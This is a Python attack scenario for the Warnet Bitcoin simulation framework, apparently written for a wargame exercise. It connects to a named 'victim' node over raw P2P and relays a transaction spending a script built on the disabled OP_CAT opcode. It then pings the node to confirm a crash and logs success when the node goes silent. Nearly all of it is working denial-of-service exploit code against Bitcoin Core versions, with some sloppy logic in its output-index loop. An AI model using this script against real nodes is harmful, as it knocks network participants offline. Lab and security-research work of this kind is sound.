#!/usr/bin/env python3

import socket
import time

from commander import Commander

from test_framework.messages import (
    MSG_TX,
    CInv,
    tx_from_hex,
    msg_tx,
    COIN,
    CTxIn,
    COutPoint,
    CTxOut,
    CTransaction,
    msg_ping,
)
from test_framework.p2p import P2PInterface
from test_framework.script import CScript, OP_CAT
from test_framework.address import script_to_p2sh, address_to_scriptpubkey


class Corn(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate network reconnaissance using a scenario and P2PInterface"
        )
        parser.usage = "warnet run v95_disabled_opcode.py --debug"

    def get_node(self) : 
        for n in self.nodes:
            try:
                n.getnetworkinfo()
                node = n
                break
            except Exception as e:
                continue

        return node


    # Scenario entrypoint
    def run_test(self):
        node = self.get_node()

        for n in self.nodes:
            try:
                self.log.info(f"Index {n.index}")
                self.log.info(f"{n.getwalletinfo()}")
                node = n

            except:
                continue

        addr = node.getnewaddress()
        self.log.info("Minerando 101 blocos para %s ..." % addr)
        node.generatetoaddress(101, addr, invalid_call=False)
        self.log.info("Blockcount agora: %d" % node.getblockcount())
        utxos = node.listunspent()
        self.log.info("UTXOs disponíveis (exemplo): %s" % utxos[:1])

        # This scenario requires some funds to spend. These should be available on Battlefield
        # On Scrimmage locally make sure you have mined at least 101 blocks using:
        # warnet run scenarios/miner_std.py --debug -- --interval=1
        victim = "tank-0115-sapphire.default.svc"

        addr = socket.gethostbyname(victim)

        self.log.info("Connecting to victim")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=addr, dstport=node.p2pport, net=node.chain, timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        self.log.info("Creating first tx")

        # FILL ME IN
        script = CScript([OP_CAT])

        p2sh_address = script_to_p2sh(script)
        txid = node.sendtoaddress(p2sh_address, 0.0001)
        tx_hex = node.getrawtransaction(txid)
        first_tx = tx_from_hex(tx_hex)
        first_tx.rehash()

        vout = 0
        for v in first_tx.vout:
            if v.nValue == 0.0001:
                break
            vout += 1

        sec_tx = CTransaction()
        sec_tx.vin.append(
            CTxIn(COutPoint(first_tx.sha256, 0), scriptSig=CScript([script]))
        )
        sec_tx.vout.append(
            CTxOut(int(0.00009 * COIN), address_to_scriptpubkey(node.getnewaddress()))
        )

        for msg in [msg_tx(first_tx), msg_tx(sec_tx)]:
            self.log.info(f"Sending msg {msg}")
            attacker.send_message(msg)

        self.log.info(f"Trying to ping {victim}...")

        try:
            ping = msg_ping()
            while attacker.ping_counter < 5:
                time.sleep(3)
                self.log.info(f"Ping: {attacker.ping_counter}")
                attacker.send_message(ping)
            self.log.info("The attack ended unsuccessfully!")

        except:
            self.log.info(f"It was not possible to communicate with {victim}!")
            self.log.info(f"Ping count: {attacker.ping_counter}")
            self.log.info(f"Attack successfully completed!")


def main():
    Corn().main()


if __name__ == "__main__":
    main()
